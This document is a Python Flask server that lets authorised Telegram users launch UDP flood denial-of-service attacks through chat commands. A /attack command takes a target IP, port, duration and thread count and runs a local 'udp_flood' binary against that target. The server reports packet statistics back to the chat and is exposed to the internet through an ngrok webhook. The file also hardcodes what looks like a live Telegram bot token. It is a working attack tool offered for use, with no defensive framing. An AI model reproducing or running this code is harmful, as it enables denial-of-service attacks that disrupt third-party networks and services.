#!/usr/bin/env python3
import os
import subprocess
import threading
import time
import json
import requests
from flask import Flask, request, jsonify

# Configuration
BOT_TOKEN = os.getenv('BOT_TOKEN', '7704220520:AAEI_ouYgKUdt52-ec9JJDjdo44pme781Ls')
AUTHORIZED_USERS = [7022875343]  # Replace with your user ID

app = Flask(__name__)

# Global state
current_process = None
is_running = False
attack_stats = {"sent": 0, "errors": 0, "start_time": None}

def is_authorized(user_id):
    return user_id in AUTHORIZED_USERS

def send_telegram_message(chat_id, text):
    """Send message via Telegram Bot API"""
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        payload = {
            'chat_id': chat_id,
            'text': text,
            'parse_mode': 'HTML'
        }
        response = requests.post(url, json=payload, timeout=10)
        return response.status_code == 200
    except Exception as e:
        print(f"Error sending message: {e}")
        return False

def run_attack(target_ip, target_port, duration, threads, chat_id):
    global current_process, is_running, attack_stats
    
    try:
        is_running = True
        attack_stats = {"sent": 0, "errors": 0, "start_time": time.time()}
        
        print(f"Starting attack: {target_ip}:{target_port} for {duration}s with {threads} threads")
        
        # Run the attack
        current_process = subprocess.Popen(
            ['./udp_flood', target_ip, str(target_port), str(duration), str(threads)],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        
        # Read output in real-time and parse stats
        for line in iter(current_process.stdout.readline, ''):
            line = line.strip()
            if line:
                print(f"Attack output: {line}")
                
                # Parse stats from output
                if 'Sent:' in line and 'Errors:' in line:
                    try:
                        parts = line.split('Sent:')[1].split(',')
                        sent_part = parts[0].strip()
                        errors_part = parts[1].split('Errors:')[1].split(',')[0].strip()
                        attack_stats['sent'] = int(sent_part)
                        attack_stats['errors'] = int(errors_part)
                    except Exception as e:
                        print(f"Error parsing stats: {e}")
        
        stdout, stderr = current_process.communicate()
        
        # Send completion message
        if current_process.returncode == 0:
            result_text = f"✅ <b>Attack Completed!</b>\n\n📊 <b>Final Results:</b>\n{stdout[-1000:]}"
        else:
            result_text = f"❌ <b>Attack Failed!</b>\n\nError:\n{stderr[-1000:]}"
        
        send_telegram_message(chat_id, result_text)
        
    except Exception as e:
        error_text = f"❌ <b>Attack Error:</b>\n{str(e)}"
        send_telegram_message(chat_id, error_text)
        print(f"Attack error: {e}")
    finally:
        is_running = False
        current_process = None

@app.route('/webhook', methods=['POST'])
def webhook():
    try:
        data = request.get_json()
        print(f"Received webhook: {data}")
        
        if 'message' in data:
            message = data['message']
            user_id = message['from']['id']
            chat_id = message['chat']['id']
            text = message.get('text', '')
            
            handle_message(chat_id, user_id, text)
        
        return jsonify({'status': 'ok'})
    except Exception as e:
        print(f"Webhook error: {e}")
        return jsonify({'status': 'error', 'message': str(e)})

@app.route('/')
def home():
    return "🤖 Telegram Bot Server is Running!"

@app.route('/health')
def health():
    return jsonify({'status': 'healthy', 'running': is_running})

def handle_message(chat_id, user_id, text):
    """Handle incoming Telegram messages"""
    if not is_authorized(user_id):
        send_telegram_message(chat_id, "❌ <b>Unauthorized access!</b>")
        return
    
    if text.startswith('/start'):
        help_text = """
🚀 <b>GitHub UDP Bot</b>

<b>Commands:</b>
/start - Show this help
/attack IP PORT TIME THREADS - Start attack
/stop - Stop current attack  
/status - Show status
/stats - Show attack statistics

<b>Example:</b>
<code>/attack 192.168.1.1 80 60 10</code>

<b>Limits:</b>
⏰ Max time: 300 seconds
🧵 Max threads: 20
        """
        send_telegram_message(chat_id, help_text)
        
    elif text.startswith('/attack'):
        global is_running
        
        if is_running:
            send_telegram_message(chat_id, "⚠️ <b>Attack already running!</b> Use /stop first.")
            return
            
        parts = text.split()
        if len(parts) != 5:
            send_telegram_message(chat_id, "❌ <b>Usage:</b> <code>/attack IP PORT TIME THREADS</code>")
            return
            
        try:
            ip, port, duration, threads = parts[1], int(parts[2]), int(parts[3]), int(parts[4])
            
            # Validate
            if duration > 300:
                send_telegram_message(chat_id, "❌ <b>Duration too long!</b> Max: 300 seconds")
                return
            if threads > 20:
                send_telegram_message(chat_id, "❌ <b>Too many threads!</b> Max: 20 threads")
                return
                
            # Start attack
            send_telegram_message(chat_id, 
                f"🎯 <b>Starting Attack...</b>\n"
                f"📍 <b>Target:</b> {ip}:{port}\n"
                f"⏰ <b>Duration:</b> {duration}s\n"
                f"🧵 <b>Threads:</b> {threads}\n"
                f"🕒 <b>Started:</b> {time.strftime('%Y-%m-%d %H:%M:%S')}")
                
            attack_thread = threading.Thread(
                target=run_attack, 
                args=(ip, port, duration, threads, chat_id),
                daemon=True
            )
            attack_thread.start()
            
        except Exception as e:
            send_telegram_message(chat_id, f"❌ <b>Error:</b> {str(e)}")
            
    elif text.startswith('/stop'):
        global current_process
        
        if not is_running:
            send_telegram_message(chat_id, "ℹ️ <b>No attack running</b>")
            return
            
        try:
            if current_process:
                current_process.terminate()
                current_process.wait(timeout=5)
            is_running = False
            send_telegram_message(chat_id, "🛑 <b>Attack stopped!</b>")
        except:
            if current_process:
                current_process.kill()
            is_running = False
            send_telegram_message(chat_id, "🛑 <b>Attack force stopped!</b>")
            
    elif text.startswith('/status'):
        status = "🟢 <b>Running</b>" if is_running else "🔴 <b>Stopped</b>"
        send_telegram_message(chat_id, f"<b>Status:</b> {status}")
        
    elif text.startswith('/stats'):
        if attack_stats['start_time']:
            elapsed = time.time() - attack_stats['start_time']
            stats_text = (
                f"📊 <b>Attack Statistics</b>\n"
                f"📤 <b>Packets Sent:</b> {attack_stats['sent']}\n"
                f"❌ <b>Errors:</b> {attack_stats['errors']}\n"
                f"⏱️ <b>Elapsed:</b> {int(elapsed)}s\n"
                f"📈 <b>PPS:</b> {int(attack_stats['sent'] / elapsed) if elapsed > 0 else 0}"
            )
        else:
            stats_text = "📊 <b>No active attack statistics</b>"
        send_telegram_message(chat_id, stats_text)
        
    else:
        send_telegram_message(chat_id, "❓ <b>Unknown command.</b> Use /start for help.")

def setup_webhook():
    """Setup Telegram webhook with ngrok URL"""
    try:
        # Get ngrok public URL
        response = requests.get('http://localhost:4040/api/tunnels', timeout=10)
        tunnels = response.json()['tunnels']
        public_url = next((tunnel['public_url'] for tunnel in tunnels if tunnel['proto'] == 'https'), None)
        
        if public_url:
            webhook_url = f"{public_url}/webhook"
            # Set Telegram webhook
            set_webhook_url = f"https://api.telegram.org/bot{BOT_TOKEN}/setWebhook?url={webhook_url}"
            response = requests.get(set_webhook_url, timeout=10)
            
            if response.status_code == 200:
                print(f"✅ Webhook set successfully: {webhook_url}")
            else:
                print(f"❌ Failed to set webhook: {response.text}")
        else:
            print("❌ Could not get ngrok public URL")
            
    except Exception as e:
        print(f"❌ Webhook setup error: {e}")

if __name__ == '__main__':
    # Wait a bit for ngrok to start
    time.sleep(3)
    
    # Setup webhook
    setup_webhook()
    
    print("🚀 Starting Flask server on port 8080...")
    print("🤖 Bot is ready to receive messages!")
    
    # Start Flask server
    app.run(host='0.0.0.0', port=8080, debug=False, threaded=True)
